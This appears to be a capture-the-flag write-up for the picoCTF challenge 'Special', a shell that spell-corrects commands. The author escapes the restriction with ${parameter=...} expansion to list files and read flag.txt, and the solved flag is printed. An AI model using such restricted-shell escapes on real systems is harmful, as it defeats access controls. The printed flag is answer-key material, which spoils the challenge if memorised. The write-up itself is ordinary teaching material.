## Objetivo 
Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM) Start your instance to see connection details.

Additional details will be available after launching your challenge instance.

Start your instance to see connection details. `ssh -p 64669 ctf-player@saturn.picoctf.net` The password is `af86add3`
## Solución  

```bash 

┌──(kali㉿kali)-[~]
└─$ ssh -p 64669 ctf-player@saturn.picoctf.net 
ctf-player@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Sep 17 17:17:02 2024 from 127.0.0.1
Special$ lsls

Less 
sh: 1: Less: not found
Special$ Traceback (most recent call last):
  File "/usr/local/Special.py", line 19, in <module>
    elif cmd[0] == '/':
IndexError: string index out of range
Connection to saturn.picoctf.net closed.
                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ ssh -p 64669 ctf-player@saturn.picoctf.net
ctf-player@saturn.picoctf.net's password: 
Permission denied, please try again.
ctf-player@saturn.picoctf.net's password: 
Permission denied, please try again.
ctf-player@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Sep 17 17:29:22 2024 from 127.0.0.1
Special$ ls
Is 
sh: 1: Is: not found
Special$ {parameter?ls}
{parameter?ls} 
sh: 1: {parameter?ls}: not found
Special$ ${:ls}
${:ls} 
sh: 1: Bad substitution
Special$ ${parameter=cd blargh}
${parameter=cd blargh} 
Special$ ${parameter=ls blargh}
${parameter=ls blargh} 
flag.txt
Special$ ${parameter=cat < blargh/flag.txt}
${parameter=cat < blargh/flag.txt} 
cat: '<': No such file or directory
picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6}Special$ Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.


```

## Notas Adicionales 

### Referencias
